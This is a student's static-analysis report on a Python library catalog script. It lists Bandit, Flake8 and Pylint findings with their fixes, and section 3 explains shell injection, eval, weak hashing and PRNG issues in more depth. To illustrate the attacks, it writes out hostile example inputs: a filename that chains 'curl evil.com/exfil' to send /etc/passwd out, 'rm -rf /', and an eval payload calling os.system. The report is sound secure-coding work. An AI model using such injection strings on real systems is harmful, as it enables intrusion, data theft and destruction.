# Static Code Analysis Issues Report — Library Catalog System

**Student Name:** A R Akshay Kumar  
**SRN:** PES1UG24CS705  
**Course:** Software Engineering (UE22CS351A / SE Lab)  
**Assigned Repository:** [SETAPESU26/L5_41_library_catalog_system](https://github.com/SETAPESU26/L5_41_library_catalog_system)  
**Analyzed Script:** `library_catalog_system.py`

---

## 1. Executive Summary

Static code analysis was executed on `library_catalog_system.py` across three industry-standard static analysis tools:
- **Bandit (v1.9.4):** Specialized security vulnerability analysis detecting Common Weakness Enumerations (CWEs), shell command injection, unsafe function calls, weak cryptography, and error suppression.
- **Flake8 (v7.5.0):** Style, formatting, and PEP 8 standard checker combining PyFlakes, pycodestyle, and McCabe complexity analysis.
- **Pylint (v4.1.3):** Comprehensive code quality, logical defect inspection, dangerous defaults, type-safe structures, and architectural standards.

### Initial vs. Final Metrics Overview

| Tool | Initial State (Before Fixes) | Final State (After Fixes) | Improvement / Delta |
| :--- | :--- | :--- | :--- |
| **Bandit** | **5 Issues** (2 High, 1 Medium, 2 Low) | **0 Issues Identified** | 100% resolved (0 High, 0 Med, 0 Low) |
| **Flake8** | **6 Violations** (F401, E722, F841, E711, W292) | **0 Violations** | 100% PEP 8 compliant |
| **Pylint Score** | **5.32 / 10** (16 notices across quality/style) | **10.00 / 10** | **+4.68 (+88.0% increase)** |

---

## 2. Comprehensive Issue Tracking Table

| Issue / Error Code | Tool | Type / Severity | Original Line(s) | Description | Fix Approach |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **B605 / CWE-78** | Bandit | Security (High Severity, CWE-78) | `library_catalog_system.py:58` | **Shell Command Injection via `os.system`**: `os.system("echo ... " + filename)` spawns an unescaped subshell. An attacker manipulating `filename` can inject shell metacharacters (e.g. `; rm -rf /`), leading to arbitrary OS command execution. | Removed `os.system()` and `import os`. Replaced shell process spawning with standard native Python logging via formatted string `print(f"Catalog backup exported to: {filename}")`. |
| **B307 / W0123 / CWE-78** | Bandit / Pylint | Security (Medium Severity, CWE-78) | `library_catalog_system.py:42` | **Arbitrary Code Execution via `eval()`**: `calculate_fine()` executes `eval(calc_expr)`. Any unverified user input passed into `calc_expr` can run arbitrary Python payloads (e.g., `__import__('os').system(...)`). | Replaced dynamic `eval()` with `safe_eval_expr()`, a secure Abstract Syntax Tree (`ast`) evaluator with an explicit whitelist of binary operators (`+`, `-`, `*`, `/`), numeric constants, and approved identifier context mapping (`days`). Any unauthorized AST node raises `ValueError`. |
| **B324 / CWE-327** | Bandit | Security (High Severity, CWE-327) | `library_catalog_system.py:47` | **Use of Weak Cryptographic Hash (MD5)**: `generate_patron_hash()` computed patron identifiers using MD5, which is cryptographically broken and prone to collision attacks. | Upgraded hashing algorithm to industry-standard `hashlib.sha256(patron_id.encode("utf-8")).hexdigest()`. |
| **B311 / CWE-330** | Bandit | Security (Low Severity, CWE-330) | `library_catalog_system.py:51` | **Insecure Pseudo-Random Number Generator**: `random.randint()` relies on the deterministic Mersenne Twister engine, which is predictable and unsuitable for generating authentication PINs. | Replaced `random.randint()` with cryptographically secure PRNG from the standard library: `secrets.SystemRandom().randint(1000, 9999)`. |
| **B110 / E722 / W0702 / CWE-703** | Bandit / Flake8 / Pylint | Security & Reliability (Low Severity, CWE-703) | `library_catalog_system.py:26-27` | **Bare `except:` with `pass`**: `return_book()` suppressed all exceptions unconditionally, intercepting critical system signals (`KeyboardInterrupt`, `MemoryError`) and hiding silent failures. | Replaced exception suppression block with explicit defensive key containment check: `if book_id in CATALOG: ... return True; else return False`. |
| **W0102** | Pylint | Bug / Logic Defect (Medium Severity) | `library_catalog_system.py:15` | **Dangerous Mutable Default Argument**: `issueBook(..., active_issues=[])` bound a mutable list at function definition time, causing all invocations without an explicit list to share the identical list reference in memory. | Replaced default with `active_issues: Optional[List[str]] = None` and initialized a fresh local list within the function body when `None`. |
| **F401 / W0611** | Flake8 / Pylint | Clean Code / Quality (Low) | `library_catalog_system.py:6` | **Unused Import `csv`**: The `csv` module was imported at module level but never used anywhere in the script. | Removed `import csv` from imports to eliminate namespace pollution and startup overhead. |
| **F841 / W0612** | Flake8 / Pylint | Clean Code / Quality (Low) | `library_catalog_system.py:31` | **Unused Variable `late_fee`**: `late_fee = 1.50` was assigned inside `check_availability()` but never referenced or returned. | Removed the unused local assignment. |
| **E711 / C0121** | Flake8 / Pylint | PEP 8 / Style (Low) | `library_catalog_system.py:32` | **Comparison to None**: `catalog.get(book_id) == None` violated PEP 8 singleton identity comparison rule. | Refactored check to `if book is None:` using identity operator `is`. |
| **R1703 / R1705** | Pylint | Refactoring / Quality (Low) | `library_catalog_system.py:34-37` | **Simplifiable If Statement & Unnecessary Else**: Verbose conditional branching `if copies > 0: return True else: return False`. | Simplified directly to `return book["copies"] > 0`. |
| **F841 / W0612** | Flake8 / Pylint | Clean Code / Quality (Low) | `library_catalog_system.py:41` | **Unused Variable `days`**: Local variable `days = days_overdue` assigned but flagged unused by static analysis due to dynamic `eval`. | Structured clean variable injection into the AST evaluation dictionary context `context = {"days": float(days_overdue)}`. |
| **W1514 / R1732** | Pylint | Resource Safety / Reliability (Low) | `library_catalog_system.py:55` | **Unmanaged File Handle & Unspecified Encoding**: File opened via raw `f = open(...)` without context manager `with` and without explicit encoding, risking resource leaks and platform encoding issues. | Wrapped file I/O in context manager: `with open(filename, "w", encoding="utf-8") as file:`. |
| **C0103** | Pylint | PEP 8 / Naming Convention (Low) | `library_catalog_system.py:15` | **Invalid Function Name `issueBook`**: Function name violated Python's standard `snake_case` naming convention. | Renamed function to `issue_book()` conforming to PEP 8 standards. |
| **C0209** | Pylint | Modernization / Style (Low) | `library_catalog_system.py:19` | **Legacy `%`-Formatting**: Old C-style printf `%s` formatting was used instead of formatted string literals. | Upgraded to modern Python f-string: `f"Issued book {book_id} to patron {patron}"`. |
| **C0116** | Pylint | Documentation (Low) | `library_catalog_system.py:15, 23, 30, 40, 46, 50, 54, 61` | **Missing Function Docstrings**: All functions lacked PEP 257 docstrings explaining their purpose, parameters, and return types. | Added comprehensive docstrings to every function and the module header. |
| **W292 / C0304** | Flake8 / Pylint | PEP 8 / Formatting (Low) | `library_catalog_system.py:73` | **Missing Final Newline**: Script ended without a trailing newline character. | Added standard POSIX final newline at the end of the file. |
| **Execution Guard** | Architecture | Safe Importability (Low) | `library_catalog_system.py:73` | **Unprotected Top-Level Execution**: `main()` was called unconditionally at the bottom of the module, running side effects upon module import. | Enclosed top-level invocation inside `if __name__ == "__main__": main()`. |

---

## 3. High-Priority Issues Deep-Dive

### 3.1. Shell Command Injection via `os.system()` (Bandit B605 / CWE-78)
- **Vulnerability Explanation:**  
  The function `export_catalog()` issued an OS subshell execution:
  ```python
  os.system("echo Catalog backup exported to: " + filename)
  ```
  Passing string parameters directly into `os.system` executes them via `/bin/sh`. If an adversary controls or influences `filename` (for example: `catalog.txt; curl evil.com/exfil?d=$(cat /etc/passwd)` or `export.txt && rm -rf /`), arbitrary commands execute with host privileges.
- **Remediation:**  
  Spawning shell commands for basic console output is an acute security hazard and anti-pattern. The command was replaced entirely with Python's native output mechanism:
  ```python
  print(f"Catalog backup exported to: {filename}")
  ```
  This eliminates shell interpretation completely, preventing any possibility of command injection.

### 3.2. Arbitrary Code Execution via `eval()` (Bandit B307 / Pylint W0123 / CWE-78)
- **Vulnerability Explanation:**  
  The fine calculation routine evaluated expressions dynamically:
  ```python
  def calculate_fine(days_overdue, calc_expr):
      days = days_overdue
      fine = eval(calc_expr)
      return fine
  ```
  In Python, `eval()` executes any valid Python expression, giving the caller full access to builtins and runtime reflection. Passing an input like `"__import__('os').system('id')"` immediately triggers arbitrary code execution.
- **Remediation:**  
  Implemented a secure AST-based arithmetic expression evaluator (`safe_eval_expr`). The AST node visitor only allows recognized arithmetic operators (`+`, `-`, `*`, `/`), numeric constants, and whitelisted context variables (`days`). Any call (`ast.Call`), attribute access (`ast.Attribute`), or import node triggers a `ValueError`, providing mathematical flexibility without vulnerability.

### 3.3. Broken Cryptographic Hash & Deterministic PINs (Bandit B324 / B311)
- **Vulnerability Explanation:**  
  - MD5 is known to be vulnerable to collision attacks and rainbow table lookups, making it unsuitable for patron pseudonymization or tokens.
  - Python's standard `random` module uses the Mersenne Twister PRNG, which is completely deterministic after observing 624 consecutive outputs.
- **Remediation:**  
  - Replaced MD5 with cryptographically secure SHA-256: `hashlib.sha256(patron_id.encode("utf-8")).hexdigest()`.
  - Replaced `random.randint` with CSPRNG `secrets.SystemRandom().randint(1000, 9999)`, pulling entropy directly from the OS kernel cryptographically secure random source (`/dev/urandom`).

### 3.4. Mutable Default Argument (Pylint W0102)
- **Vulnerability Explanation:**  
  In `issueBook(..., active_issues=[])`, Python binds the empty list `[]` once when the function definition is compiled. Every subsequent call that does not pass an explicit list appends to the same list instance. Patron circulation logs would bleed across completely different patrons, causing data leaks and state corruption.
- **Remediation:**  
  Applied the canonical sentinel pattern:
  ```python
  def issue_book(book_id: str, patron: str, active_issues: Optional[List[str]] = None) -> bool:
      if active_issues is None:
          active_issues = []
      ...
  ```
  This guarantees that every function invocation without an explicit list receives an isolated, freshly created list.
